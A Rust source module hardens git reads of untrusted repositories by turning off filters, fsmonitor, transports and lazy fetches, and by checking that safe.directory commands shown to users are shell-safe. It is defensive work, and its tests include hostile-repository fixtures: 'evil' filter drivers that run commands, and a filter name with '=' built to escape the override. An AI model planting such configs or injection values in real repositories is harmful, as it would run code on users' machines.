//! Running git on a repository Automatic does not trust.
//!
//! A project folder can be a repository the user downloaded with its `.git`
//! directory, so its `.git/config` is not trusted. [`git_command`] turns off
//! the settings that make a read run another program:
//!
//! - `core.fsmonitor`, with an empty `-c` value. Callers also pass the
//!   command options that turn off external diff drivers, textconv and
//!   signature display.
//! - Clean, smudge and process filters, which git runs when it re-checks a
//!   file's content. Filters from every config scope are turned off,
//!   includes counted. Their names come from `git config`, which runs
//!   nothing, and are blanked through `GIT_CONFIG_*` variables, so a name
//!   holding `=` cannot escape the override. An empty name counts too. A name
//!   that is not valid UTF-8 cannot be passed to git on every platform, so
//!   [`check_git_supports`] refuses the read. The cost: a file a global
//!   filter tracks, such as a Git LFS file, can show as changed when its stat
//!   data changed since git last checked it.
//! - Lazy fetches in a partial clone, which would run `core.sshCommand` and
//!   write objects. `GIT_NO_LAZY_FETCH` stops them on git 2.44 and later.
//!
//! `--no-optional-locks` stops a read such as `git status` from rewriting the
//! index, so it never races the user's own git commands. Every call also sets
//! `protocol.allow=never` and a no-op `core.sshCommand`, so no transport can
//! run whatever else asks for one. An exported `GIT_CONFIG` is removed,
//! because `git config` would read only that file and miss the filters. An
//! inherited `GIT_CONFIG_PARAMETERS` is removed too: git reads it after the
//! `GIT_CONFIG_COUNT` entries, so a filter passed down that way would beat
//! the blank. [`probe_command`] leaves out the options old git lacks, for the
//! first call that finds the repository.
//!
//! The filter override needs git 2.31 and `GIT_NO_LAZY_FETCH` needs git 2.44.
//! Older git ignores both silently, so [`check_git_supports`] refuses a
//! repository that needs one of them on older git, rather than let it be read
//! unprotected. Reading the config needs git 2.26, which
//! [`check_git_reads_repo_config`] checks.
//!
//! A caller reads the config with [`REPO_CONFIG_ARGS`] and
//! [`parse_repo_config`], checks it, and then runs every later command through
//! the same builder with that config.
//!
//! This module uses only `std`, so the same file serves the desktop app and
//! the CLI.

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::OnceLock;

/// The first git that reads `GIT_CONFIG_COUNT`.
const MIN_VERSION_CONFIG_ENV: GitVersion = GitVersion(2, 31);
/// The first git that reads `GIT_NO_LAZY_FETCH`.
const MIN_VERSION_NO_LAZY_FETCH: GitVersion = GitVersion(2, 44);
/// The first git with `git config --show-scope`, which [`REPO_CONFIG_ARGS`]
/// uses.
const MIN_VERSION_SHOW_SCOPE: GitVersion = GitVersion(2, 26);
/// git refuses a `GIT_CONFIG_COUNT` above `INT_MAX`.
const MAX_CONFIG_ENTRIES: usize = i32::MAX as usize;

/// Variables a calling git process, such as one running a hook, sets to point
/// git at its own repository or to hand it config: the list
/// `git rev-parse --local-env-vars` prints, and `GIT_NAMESPACE`.
/// `GIT_CONFIG_COUNT` is on git's list too, but the builder sets it rather
/// than removing it, or the filter overrides would be dropped with it.
const CALLER_VARIABLES: [&str; 15] = [
    "GIT_ALTERNATE_OBJECT_DIRECTORIES",
    "GIT_CONFIG",
    "GIT_CONFIG_PARAMETERS",
    "GIT_OBJECT_DIRECTORY",
    "GIT_DIR",
    "GIT_WORK_TREE",
    "GIT_IMPLICIT_WORK_TREE",
    "GIT_GRAFT_FILE",
    "GIT_INDEX_FILE",
    "GIT_NO_REPLACE_OBJECTS",
    "GIT_REPLACE_REF_BASE",
    "GIT_PREFIX",
    "GIT_SHALLOW_FILE",
    "GIT_COMMON_DIR",
    "GIT_NAMESPACE",
];

/// A git release as major and minor numbers.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub(crate) struct GitVersion(u32, u32);

impl std::fmt::Display for GitVersion {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}.{}", self.0, self.1)
    }
}

/// The git Automatic runs, found once per run.
#[derive(Debug, Clone)]
pub(crate) struct GitInstall {
    path: PathBuf,
    pub(crate) version: GitVersion,
}

/// The repository settings that change how Automatic reads it.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct RepoConfig {
    /// Filter drivers defined in any config scope. A name may be empty.
    filters: Vec<String>,
    /// True when a filter has a name that is not valid UTF-8, which cannot be
    /// blanked on every platform.
    non_utf8_filter: bool,
    /// Set from local and worktree scope only.
    pub(crate) partial_clone: bool,
}

/// The `git config` arguments that list every setting [`parse_repo_config`]
/// reads. Check the version with [`check_git_reads_repo_config`] first, then
/// run them through a builder with a default [`RepoConfig`].
/// `git config --get-regexp` exits 1 when nothing matches, which is not an
/// error.
pub(crate) const REPO_CONFIG_ARGS: [&str; 5] = [
    "config",
    "--show-scope",
    "-z",
    "--get-regexp",
    r"^(filter\..*|extensions\.partialclone|remote\..*\.promisor)$",
];

// ── Parsing ───────────────────────────────────────────────────────────────────

/// Parse `git config --show-scope -z --get-regexp` output: records of
/// `scope NUL key LF value NUL`.
///
/// The output is read as bytes. Decoding it first would turn a filter name
/// that is not UTF-8 into another name, and blank a filter that does not
/// exist.
pub(crate) fn parse_repo_config(output: &[u8]) -> RepoConfig {
    let mut config = RepoConfig::default();
    let mut fields = output.split(|b| *b == 0);
    while let (Some(scope), Some(entry)) = (fields.next(), fields.next()) {
        // A key written with no value prints with no line feed.
        let key = entry.split(|b| *b == b'\n').next().unwrap_or(entry);
        let repo_scope = scope == b"local" || scope == b"worktree";
        if let Some(name) = filter_name(key) {
            match std::str::from_utf8(name) {
                Ok(name) => {
                    if !config.filters.iter().any(|n| n == name) {
                        config.filters.push(name.to_string());
                    }
                }
                Err(_) => config.non_utf8_filter = true,
            }
        } else if repo_scope && is_partial_clone_key(key) {
            // Any such key counts, whatever its value. A bare key is a
            // boolean true to git, and guessing wrong here would let a fetch
            // through on old git, while guessing wrong the other way only
            // hides line counts.
            config.partial_clone = true;
        }
    }
    config
}

/// The driver name in `filter.<name>.<variable>`. The name may hold dots,
/// and may be empty: `[filter ""]` prints as `filter..clean`, and git applies
/// it to a file whose `filter` attribute is empty.
fn filter_name(key: &[u8]) -> Option<&[u8]> {
    let rest = key.strip_prefix(b"filter.")?;
    let dot = rest.iter().rposition(|b| *b == b'.')?;
    Some(&rest[..dot])
}

fn is_partial_clone_key(key: &[u8]) -> bool {
    let key = key.to_ascii_lowercase();
    key == b"extensions.partialclone" || (key.starts_with(b"remote.") && key.ends_with(b".promisor"))
}

// ── Building commands ─────────────────────────────────────────────────────────

/// A `git` command for `dir` with every setting that could run another
/// program or reach the network turned off. `config` names the filters to
/// blank. Config the user exported through `GIT_CONFIG_COUNT`
/// is kept. Fails when that count is one git cannot read, or leaves no room
/// for ours.
pub(crate) fn git_command(
    git: &GitInstall,
    dir: &Path,
    config: &RepoConfig,
) -> Result<Command, String> {
    // Settings the user exported this way are kept: ours follow them, and
    // a later entry wins.
    let inherited = inherited_config_count(std::env::var_os("GIT_CONFIG_COUNT").as_deref())?;
    build_command(git, dir, config, inherited)
}

/// The number of entries in an inherited `GIT_CONFIG_COUNT`. Unset or empty
/// is 0, as git reads it. A value that is not a count is an error rather
/// than 0, because guessing would put our entries where git does not read
/// them.
fn inherited_config_count(value: Option<&std::ffi::OsStr>) -> Result<usize, String> {
    let Some(value) = value else {
        return Ok(0);
    };
    let not_a_count = || {
        format!(
            "GIT_CONFIG_COUNT is set to '{}', which is not a count git can read. Unset it to \
             run git safely.",
            value.to_string_lossy()
        )
    };
    match value.to_str().map(str::trim) {
        Some("") => Ok(0),
        Some(text) => text.parse::<usize>().map_err(|_| not_a_count()),
        None => Err(not_a_count()),
    }
}

/// [`git_command`], cut off from a calling git process. For code that can
/// run inside a git hook, where git sets variables that point at the hook's
/// repository and passes its own config down.
///
/// Those variables are removed. Inherited `GIT_CONFIG_*` entries are dropped
/// by numbering ours from 0 and setting `GIT_CONFIG_COUNT` to our count, so
/// git reads ours and nothing past them. Removing `GIT_CONFIG_COUNT` instead
/// would also drop the filter overrides.
pub(crate) fn isolated_git_command(
    git: &GitInstall,
    dir: &Path,
    config: &RepoConfig,
) -> Result<Command, String> {
    let mut command = build_command(git, dir, config, 0)?;
    for variable in CALLER_VARIABLES {
        command.env_remove(variable);
    }
    Ok(command)
}

/// The shared builder. Our `GIT_CONFIG_*` entries start at `first_index`.
/// Fails when they would take the count past what git reads.
fn build_command(
    git: &GitInstall,
    dir: &Path,
    config: &RepoConfig,
    first_index: usize,
) -> Result<Command, String> {
    let mut command = hardened_command(git, config, first_index)?;
    command.arg("--no-optional-locks").arg("-C").arg(git_dir_arg(dir));
    Ok(command)
}

/// [`git_command`] for `git rev-parse` in `dir`, without the options old git
/// lacks: `--no-optional-locks` needs git 2.15 and `-C` needs git 1.8.5. It
/// runs in `dir` instead. `rev-parse` reads no index and takes no optional
/// lock, so it needs neither. Lets a caller find the repository, and refuse
/// old git with a clear message, on any git.
pub(crate) fn probe_command(git: &GitInstall, dir: &Path) -> Result<Command, String> {
    let inherited = inherited_config_count(std::env::var_os("GIT_CONFIG_COUNT").as_deref())?;
    let mut command = hardened_command(git, &RepoConfig::default(), inherited)?;
    command.current_dir(git_dir_arg(dir));
    Ok(command)
}

/// `dir` as git should see it. On Windows a verbatim path such as
/// `\\?\UNC\wsl.localhost\Ubuntu\home\me\app` becomes
/// `\\wsl.localhost\Ubuntu\home\me\app`, because git names the repository by
/// that plain form, and a `safe.directory` exception written for it would not
/// match the verbatim one. Elsewhere `dir` is returned unchanged.
fn git_dir_arg(dir: &Path) -> PathBuf {
    if cfg!(windows) {
        if let Some(plain) = dir.to_str().and_then(plain_windows_path) {
            return PathBuf::from(plain);
        }
    }
    dir.to_path_buf()
}

/// The longest folder path kept in plain form, in UTF-16 units. A file path
/// may reach 259, but git runs in the folder, and Windows keeps a folder path
/// under 248 so that a file name still fits in it.
const WINDOWS_MAX_DIR_PATH: usize = 247;

/// The plain form of a verbatim Windows path, or `None` when there is no
/// plain form that names the same file. Windows needs the prefix for a
/// long folder path, and for a name it would otherwise change or refuse: a trailing dot or space, a reserved device name such as `CON`, a
/// `/` (a literal character in a verbatim path, a separator in a plain one),
/// `.` and `..` parts, and characters such as `:` or `*`.
fn plain_windows_path(path: &str) -> Option<String> {
    let rest = path.strip_prefix(r"\\?\")?;
    let (plain_prefix, parts) = if let Some(unc) = rest
        .strip_prefix(r"UNC\")
        .or_else(|| rest.strip_prefix(r"unc\"))
    {
        let mut pieces = unc.splitn(3, '\\');
        let server = pieces.next().filter(|s| !s.is_empty())?;
        let share = pieces.next().filter(|s| !s.is_empty())?;
        if !is_plain_name(server) || !is_plain_name(share) {
            return None;
        }
        (format!(r"\\{server}\{share}"), pieces.next())
    } else {
        let drive = rest.chars().next().filter(char::is_ascii_alphabetic)?;
        // `\\?\C:` alone would become `C:`, which means the current folder
        // on drive C, not its root.
        let parts = rest.get(1..)?.strip_prefix(r":\")?;
        (format!(r"{drive}:"), Some(parts))
    };
    let mut plain = plain_prefix;
    if let Some(parts) = parts.filter(|p| !p.is_empty()) {
        for part in parts.strip_suffix('\\').unwrap_or(parts).split('\\') {
            if !is_plain_name(part) {
                return None;
            }
            plain.push('\\');
            plain.push_str(part);
        }
    } else if !plain.starts_with(r"\\") {
        plain.push('\\');
    }
    (plain.encode_utf16().count() <= WINDOWS_MAX_DIR_PATH).then_some(plain)
}

/// Whether Windows reads `name` the same with and without the `\\?\` prefix.
fn is_plain_name(name: &str) -> bool {
    if name.is_empty() || name == "." || name == ".." || name.ends_with(['.', ' ']) {
        return false;
    }
    if name
        .chars()
        .any(|c| c.is_control() || matches!(c, '/' | '<' | '>' | ':' | '"' | '|' | '?' | '*'))
    {
        return false;
    }
    !is_reserved_device_name(name)
}

/// Device names Windows reserves in every folder, with or without an
/// extension: `NUL` and `nul.txt` both name the null device.
fn is_reserved_device_name(name: &str) -> bool {
    let stem = name.split('.').next().unwrap_or(name).trim_end_matches(' ');
    let upper = stem.to_ascii_uppercase();
    if matches!(upper.as_str(), "CON" | "PRN" | "AUX" | "NUL" | "CONIN$" | "CONOUT$") {
        return true;
    }
    let mut chars = upper.chars();
    let prefix: String = chars.by_ref().take(3).collect();
    let digit: String = chars.collect();
    (prefix == "COM" || prefix == "LPT")
        && matches!(digit.as_str(), "0" | "1" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9" | "¹" | "²" | "³")
}

/// The text Automatic shows when git refuses a repository whose folder
/// another user owns, or `None` when `stderr` is a different error. `dir` is
/// the folder git was run in.
///
/// git 2.35.2 and later refuse such a repository unless it is listed in
/// `safe.directory`. That is git's own protection against a folder planted by
/// another user, so Automatic does not override it. When the refused folder
/// is `dir` itself, the message ends with git's own command for the
/// exception, on its own line, so the path is in the form git expects.
///
/// The refused path is chosen by whoever owns that folder, and the user may
/// paste the command into a shell. So the command is offered only when git's
/// hint names the same path as git's error, and that path holds only
/// characters no shell treats specially. A path that fails either check, or
/// a repository found above `dir`, gets an explanation and no command.
pub(crate) fn unsafe_ownership_message(stderr: &str, dir: &Path) -> Option<String> {
    let refusal = parse_ownership_refusal(stderr)?;
    let shown = refusal.path.filter(|path| is_shell_inert_path(path));
    let Some(path) = shown else {
        return Some(
            "Git will not read this repository, because its folder belongs to a different \
             user. This is common for WSL folders, network shares and external drives. If you \
             trust it, add its folder to git's safe.directory setting, then try again."
                .to_string(),
        );
    };
    let shell = if cfg!(windows) { "PowerShell or Git Bash" } else { "a terminal" };
    let explanation = match folder_relation(path, dir) {
        FolderRelation::Same => format!(
            "Git will not read the repository at {path}, because its folder belongs to a \
             different user."
        ),
        FolderRelation::Parent if !is_root_folder(path) => format!(
            "Git will not read the repository at {path}, which holds the project folder, \
             because that folder belongs to a different user."
        ),
        // A repository at a drive or share root, or beside the project, is
        // where another user plants one: no command to trust it.
        FolderRelation::Parent | FolderRelation::Other => {
            return Some(format!(
                "Git found a repository at {path}, which is not the project folder, and will \
                 not read it because another user owns that folder. Do not trust that folder \
                 unless you expected a repository there."
            ))
        }
    };
    let explanation =
        format!("{explanation} This is common for WSL folders, network shares and external drives.");
    Some(match refusal.hint.filter(|hint| hint_names(hint, path)) {
        Some(command) => format!(
            "{explanation} If you trust it, run this command once in {shell}, then try \
             again:\n{command}"
        ),
        None => format!(
            "{explanation} If you trust it, add that folder to git's safe.directory setting, \
             then try again."
        ),
    })
}

/// What git's ownership refusal says.
struct OwnershipRefusal<'a> {
    /// The refused folder, when git's error line holds it whole.
    path: Option<&'a str>,
    /// git's `git config --global --add safe.directory ...` line, unchecked.
    hint: Option<&'a str>,
}

const SAFE_DIRECTORY_COMMAND: &str = "git config --global --add safe.directory ";

/// Read git's ownership refusal from `stderr`, or `None` for another error.
/// Only git's first `fatal:` line decides the kind of error, so a path that
/// holds the same words cannot turn another error into this one. A path with
/// a line break leaves that line without its closing quote, so it gives no
/// path, and no command can be built from text the path injected.
fn parse_ownership_refusal(stderr: &str) -> Option<OwnershipRefusal<'_>> {
    let mut lines = stderr.lines();
    let fatal = lines.by_ref().find(|line| line.starts_with("fatal: "))?.trim_end();
    // git 2.36 and later.
    const DUBIOUS: &str = "fatal: detected dubious ownership in repository at '";
    // git 2.35.2 and 2.35.3.
    const UNSAFE: &str = "fatal: unsafe repository ('";
    let path = match (fatal.strip_prefix(DUBIOUS), fatal.strip_prefix(UNSAFE)) {
        (Some(rest), _) => rest.strip_suffix('\''),
        (None, Some(rest)) => rest.strip_suffix("' is owned by someone else)"),
        (None, None) => return None,
    };
    // The hint is the first line after git's "call:" line that is not blank.
    let hint = lines
        .by_ref()
        .find(|line| line.trim() == "To add an exception for this directory, call:")
        .and_then(|_| lines.map(str::trim).find(|line| !line.is_empty()))
        .filter(|line| line.starts_with(SAFE_DIRECTORY_COMMAND));
    Some(OwnershipRefusal { path, hint })
}

/// Whether `path` is safe to show and to paste into any shell: ASCII letters,
/// digits, spaces and `/ . _ ~ @ + , = : -`. Leaves out quotes, `& ; | $ %`,
/// brackets, control characters and every non-ASCII character, which
/// includes the invisible ones that can make shown text differ from copied
/// text.
fn is_shell_inert_path(path: &str) -> bool {
    !path.is_empty()
        && path.chars().all(|c| {
            c.is_ascii_alphanumeric() || matches!(c, ' ' | '/' | '.' | '_' | '~' | '@' | '+' | ',' | '=' | ':' | '-')
        })
}

/// Whether git's `hint` adds exactly `path`. git quotes the argument in
/// single quotes (2.36 to 2.3x leave it bare), and on Windows writes a UNC
/// path as `%(prefix)/` followed by the path. A bare argument with a space
/// would be split by the shell, so it does not count.
fn hint_names(hint: &str, path: &str) -> bool {
    let Some(arg) = hint.strip_prefix(SAFE_DIRECTORY_COMMAND) else {
        return false;
    };
    let quoted = arg.len() >= 2 && arg.starts_with('\'') && arg.ends_with('\'');
    let value = if quoted { &arg[1..arg.len() - 1] } else { arg };
    if !quoted && value.contains(' ') {
        return false;
    }
    value.strip_prefix("%(prefix)/").unwrap_or(value) == path
}

/// Where git's refused folder sits relative to the project folder.
#[derive(Debug, PartialEq, Eq)]
enum FolderRelation {
    Same,
    /// The refused folder holds the project folder, as for a project inside
    /// a larger repository.
    Parent,
    Other,
}

/// How git's `refused` path, written with `/`, relates to the folder `dir`.
/// Windows paths are compared without case, in plain form. A path git
/// resolved through a link is compared with `dir` resolved too.
fn folder_relation(refused: &str, dir: &Path) -> FolderRelation {
    let refused = comparable_path(refused);
    let resolved = dir.canonicalize().ok();
    let candidates: Vec<String> = [Some(dir), resolved.as_deref()]
        .into_iter()
        .flatten()
        .filter_map(Path::to_str)
        .map(comparable_path)
        .collect();
    if candidates.contains(&refused) {
        return FolderRelation::Same;
    }
    let prefix = if refused.ends_with('/') { refused.clone() } else { format!("{refused}/") };
    if candidates.iter().any(|candidate| candidate.starts_with(&prefix)) {
        FolderRelation::Parent
    } else {
        FolderRelation::Other
    }
}

/// `path` in one form for comparing: plain Windows form, `/` separators on
/// Windows, no trailing `/` except for `/` itself, and no case on Windows.
fn comparable_path(path: &str) -> String {
    // A long verbatim path has no plain form git can be given, but git still
    // reports it without the prefix.
    let plain = plain_windows_path(path).unwrap_or_else(|| {
        if let Some(unc) = path.strip_prefix(r"\\?\UNC\") {
            format!(r"\\{unc}")
        } else {
            path.strip_prefix(r"\\?\").unwrap_or(path).to_string()
        }
    });
    let slashed = if cfg!(windows) { plain.replace('\\', "/") } else { plain };
    let trimmed = slashed.trim_end_matches('/');
    let trimmed = if trimmed.is_empty() { "/" } else { trimmed };
    if cfg!(windows) {
        trimmed.to_lowercase()
    } else {
        trimmed.to_string()
    }
}

/// Whether git's `path` is a filesystem, drive or share root: `/`, `C:/`,
/// or `//server/share`. A repository there holds every folder below it, so
/// Automatic never offers to trust one.
fn is_root_folder(path: &str) -> bool {
    let path = path.replace('\\', "/");
    let path = path.trim_end_matches('/');
    if path.is_empty() {
        return true;
    }
    let bytes = path.as_bytes();
    if bytes.len() == 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' {
        return true;
    }
    if let Some(unc) = path.strip_prefix("//") {
        return unc.split('/').filter(|part| !part.is_empty()).count() <= 2;
    }
    false
}

/// A [`Command`] for `program` that opens no console window on Windows. For
/// git calls outside the hardened builders, such as clones of sources the
/// user added.
pub(crate) fn console_free_command<S: AsRef<std::ffi::OsStr>>(program: S) -> Command {
    let mut command = Command::new(program);
    hide_console_window(&mut command);
    command
}

/// Stop a git process from opening a console window. Automatic's Windows
/// build has no console, so Windows gives each console program it starts a
/// new window of its own. The Summary runs git each time the app regains
/// focus, and each window takes focus, so they would keep coming.
pub(crate) fn hide_console_window(command: &mut Command) {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        /// `CREATE_NO_WINDOW` from the Windows process-creation flags.
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        command.creation_flags(CREATE_NO_WINDOW);
    }
    #[cfg(not(windows))]
    let _ = command;
}

/// The `-c` settings, environment and filter overrides every command gets.
fn hardened_command(
    git: &GitInstall,
    config: &RepoConfig,
    first_index: usize,
) -> Result<Command, String> {
    let mut command = Command::new(&git.path);
    hide_console_window(&mut command);
    command
        .arg("--no-pager")
        .args(["-c", "protocol.allow=never"])
        .args(["-c", "core.sshCommand=false"])
        // Empty, not `false`: before git 2.36 the value is a hook path, and
        // `false` would be run as a program. An empty value is no hook on old
        // git and boolean false on new git.
        .args(["-c", "core.fsmonitor="])
        .args(["-c", "core.quotePath=false"])
        .args(["-c", "color.ui=false"])
        .args(["-c", "log.showSignature=false"])
        // Callers match error text, so it must not be translated.
        .env("LC_ALL", "C")
        .env("GIT_OPTIONAL_LOCKS", "0")
        .env("GIT_NO_LAZY_FETCH", "1")
        // An allow-list that overrides every `protocol.*` setting, including
        // a per-protocol `protocol.<name>.allow` in the repository's config,
        // which `protocol.allow=never` does not. Works on old git too.
        .env("GIT_ALLOW_PROTOCOL", "none")
        // `git config` would read only this file and miss the filters, so
        // they would not be blanked.
        .env_remove("GIT_CONFIG")
        // git reads this after the `GIT_CONFIG_COUNT` entries, so a filter
        // passed down in it would beat the blank. Our own `-c` arguments are
        // read from the command line.
        .env_remove("GIT_CONFIG_PARAMETERS");

    let mut overrides: Vec<(String, &str)> = Vec::new();
    for name in &config.filters {
        for variable in ["clean", "smudge", "process"] {
            overrides.push((format!("filter.{name}.{variable}"), ""));
        }
        overrides.push((format!("filter.{name}.required"), "false"));
    }
    let count = first_index
        .checked_add(overrides.len())
        .filter(|count| *count <= MAX_CONFIG_ENTRIES)
        .ok_or_else(|| {
            format!(
                "GIT_CONFIG_COUNT is set to {first_index}, which leaves no room for the settings \
                 that keep git filters off. Unset it to run git safely."
            )
        })?;
    command.env("GIT_CONFIG_COUNT", count.to_string());
    for (offset, (key, value)) in overrides.iter().enumerate() {
        let index = first_index + offset;
        command
            .env(format!("GIT_CONFIG_KEY_{index}"), key)
            .env(format!("GIT_CONFIG_VALUE_{index}"), value);
    }
    Ok(command)
}

/// Refuse a git too old to run [`REPO_CONFIG_ARGS`]. `purpose` ends the
/// message's last sentence, "Update git to ...".
pub(crate) fn check_git_reads_repo_config(version: GitVersion, purpose: &str) -> Result<(), String> {
    if version < MIN_VERSION_SHOW_SCOPE {
        return Err(format!(
            "Reading this repository's git config safely needs git {MIN_VERSION_SHOW_SCOPE} or \
             later, and git {version} is installed. Update git to {purpose}."
        ));
    }
    Ok(())
}

/// Refuse a repository whose protection this git would silently ignore.
/// `purpose` ends the message's last sentence, "Update git to ...".
pub(crate) fn check_git_supports(
    config: &RepoConfig,
    version: GitVersion,
    purpose: &str,
) -> Result<(), String> {
    if config.non_utf8_filter {
        return Err(format!(
            "A git filter has a name that is not valid UTF-8, so Automatic cannot turn it off. \
             Rename that filter, in your git config or in this repository's, to {purpose}."
        ));
    }
    if !config.filters.is_empty() && version < MIN_VERSION_CONFIG_ENV {
        return Err(format!(
            "Git filters are set in your git config or in this repository's. Reading the \
             repository safely needs git \
             {MIN_VERSION_CONFIG_ENV} or later, and git {version} is installed. Update git to {purpose}."
        ));
    }
    if config.partial_clone && version < MIN_VERSION_NO_LAZY_FETCH {
        return Err(format!(
            "This repository is a partial clone. Reading it without fetching needs git \
             {MIN_VERSION_NO_LAZY_FETCH} or later, and git {version} is installed. Update git to {purpose}."
        ));
    }
    Ok(())
}

// ── Finding git ───────────────────────────────────────────────────────────────

/// The installed git, checked once per run. `None` when there is no usable
/// git.
///
/// On macOS, `/usr/bin/git` is a stub when the Command Line Tools are
/// missing, and running it opens the system's install dialog. The Summary
/// reloads on every window focus, so that dialog would keep returning. The
/// stub is used only when `xcode-select -p` finds a developer directory,
/// which opens nothing. Installing git while the app runs takes effect on
/// the next launch.
pub(crate) fn git_install() -> Option<&'static GitInstall> {
    static INSTALL: OnceLock<Option<GitInstall>> = OnceLock::new();
    INSTALL.get_or_init(detect_git).as_ref()
}

#[cfg(test)]
pub(crate) fn git_available() -> bool {
    git_install().is_some()
}

#[cfg(test)]
impl GitVersion {
    pub(crate) fn new(major: u32, minor: u32) -> Self {
        Self(major, minor)
    }
}

#[cfg(all(test, unix))]
impl GitInstall {
    /// This git, run through a script in `dir` that points
    /// `GIT_CONFIG_GLOBAL` at `global`, as the user's own global config
    /// would be. The test's own process environment is left alone. `None`
    /// when this git cannot read `key` from that file: git reads
    /// `GIT_CONFIG_GLOBAL` only from 2.32, and a test would then prove
    /// nothing.
    /// This git, run through a script in `dir` that makes it treat every
    /// repository as owned by another user, as git for Windows does with a
    /// WSL folder. `None` when this git does not refuse `repo` that way:
    /// git honours `GIT_TEST_ASSUME_DIFFERENT_OWNER` only from 2.36.
    pub(crate) fn assuming_another_owner(&self, dir: &Path, repo: &Path) -> Option<Self> {
        use std::os::unix::fs::PermissionsExt;
        let wrapper = dir.join("git-another-owner");
        let script = format!(
            "#!/bin/sh\nGIT_TEST_ASSUME_DIFFERENT_OWNER=1\nexport GIT_TEST_ASSUME_DIFFERENT_OWNER\nexec {} \"$@\"\n",
            shell_quote(&self.path)
        );
        std::fs::write(&wrapper, script).unwrap();
        std::fs::set_permissions(&wrapper, std::fs::Permissions::from_mode(0o755)).unwrap();
        let output = Command::new(&wrapper)
            .args(["rev-parse", "--git-dir"])
            .current_dir(repo)
            .env("LC_ALL", "C")
            .output()
            .ok()?;
        let refused = !output.status.success()
            && String::from_utf8_lossy(&output.stderr).contains("detected dubious ownership");
        refused.then_some(Self {
            path: wrapper,
            version: self.version,
        })
    }

    pub(crate) fn with_global_config(&self, dir: &Path, global: &Path, key: &str) -> Option<Self> {
        use std::os::unix::fs::PermissionsExt;
        let wrapper = dir.join("git-with-global-config");
        let script = format!(
            "#!/bin/sh\nGIT_CONFIG_GLOBAL={}\nexport GIT_CONFIG_GLOBAL\nexec {} \"$@\"\n",
            shell_quote(global),
            shell_quote(&self.path)
        );
        std::fs::write(&wrapper, script).unwrap();
        std::fs::set_permissions(&wrapper, std::fs::Permissions::from_mode(0o755)).unwrap();
        let reads = Command::new(&wrapper)
            .args(["config", "--global", "--get", key])
            .output()
            .is_ok_and(|output| output.status.success());
        reads.then_some(Self {
            path: wrapper,
            version: self.version,
        })
    }
}

/// `path` in single quotes for `sh`, with each `'` written as `'\''`.
#[cfg(all(test, unix))]
fn shell_quote(path: &Path) -> String {
    format!("'{}'", path.display().to_string().replace('\'', r"'\''"))
}

#[cfg(test)]
impl GitInstall {
    /// This git, reporting `version` instead of its own.
    pub(crate) fn with_version(&self, version: GitVersion) -> Self {
        Self {
            path: self.path.clone(),
            version,
        }
    }
}

fn detect_git() -> Option<GitInstall> {
    let name = if cfg!(windows) { "git.exe" } else { "git" };
    let path = find_on_path(name)?;
    if cfg!(target_os = "macos") && path == Path::new("/usr/bin/git") && !xcode_tools_installed() {
        return None;
    }
    let mut command = Command::new(&path);
    hide_console_window(&mut command);
    let output = command
        .arg("--version")
        .env("LC_ALL", "C")
        .stdin(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let version = parse_git_version(&String::from_utf8_lossy(&output.stdout))?;
    Some(GitInstall { path, version })
}

/// The version in `git --version` output, such as
/// `git version 2.39.5 (Apple Git-154)` or `git version 2.45.1.windows.1`.
fn parse_git_version(text: &str) -> Option<GitVersion> {
    let number = text.trim().strip_prefix("git version ")?;
    let mut parts = number.split(|c: char| !c.is_ascii_digit());
    let major = parts.next()?.parse().ok()?;
    let minor = parts.next()?.parse().ok()?;
    Some(GitVersion(major, minor))
}

fn xcode_tools_installed() -> bool {
    Command::new("/usr/bin/xcode-select")
        .arg("-p")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

/// The first `name` on PATH that can be run, as `Command::new(name)` finds it.
fn find_on_path(name: &str) -> Option<PathBuf> {
    find_in(&std::env::var_os("PATH")?, name)
}

/// The first `name` in the folders of `path_value`, a PATH-style list.
/// Folders that are not absolute are skipped, an empty entry and `.`
/// included. A relative result would resolve against the child's working
/// folder, and some commands run git inside the untrusted project.
fn find_in(path_value: &std::ffi::OsStr, name: &str) -> Option<PathBuf> {
    std::env::split_paths(path_value)
        .filter(|dir| dir.is_absolute())
        .map(|dir| dir.join(name))
        .find(|candidate| is_executable_file(candidate))
}

#[cfg(unix)]
fn is_executable_file(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path)
        .map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

#[cfg(not(unix))]
fn is_executable_file(path: &Path) -> bool {
    path.is_file()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::ffi::OsStr;

    #[test]
    fn repo_config_keeps_filters_from_every_scope() {
        let out = b"system\0filter.sys.smudge\ntouch s\0\
global\0filter.lfs.clean\ngit-lfs clean -- %f\0\
local\0filter.evil.clean\ntouch x\0\
local\0filter.evil.process\ntouch y\0\
local\0filter.inc.luded=x.smudge\ntouch z\0\
worktree\0filter.wt.clean\ntouch w\0\
command\0filter.cmd.clean\ntouch c\0";
        let config = parse_repo_config(out);
        assert_eq!(config.filters, vec!["sys", "lfs", "evil", "inc.luded=x", "wt", "cmd"]);
        assert!(!config.partial_clone);
    }

    #[test]
    fn repo_config_keeps_an_empty_filter_name() {
        let config = parse_repo_config(b"local\0filter..clean\ntouch x\0local\0filter.clean\nx\0");
        // `filter.clean` has no driver name, so it is no filter at all.
        assert_eq!(config.filters, vec![""]);
        assert!(!config.non_utf8_filter);
    }

    #[test]
    fn repo_config_flags_a_filter_name_that_is_not_utf8() {
        let config = parse_repo_config(b"local\0filter.ev\xffil.clean\ntouch x\0local\0filter.ok.clean\nx\0");
        assert!(config.non_utf8_filter);
        assert_eq!(config.filters, vec!["ok"]);
        // A global filter counts as much as the repository's own.
        let config = parse_repo_config(b"global\0filter.\xff.clean\nx\0");
        assert!(config.non_utf8_filter);
        // A value that is not UTF-8 is not a name.
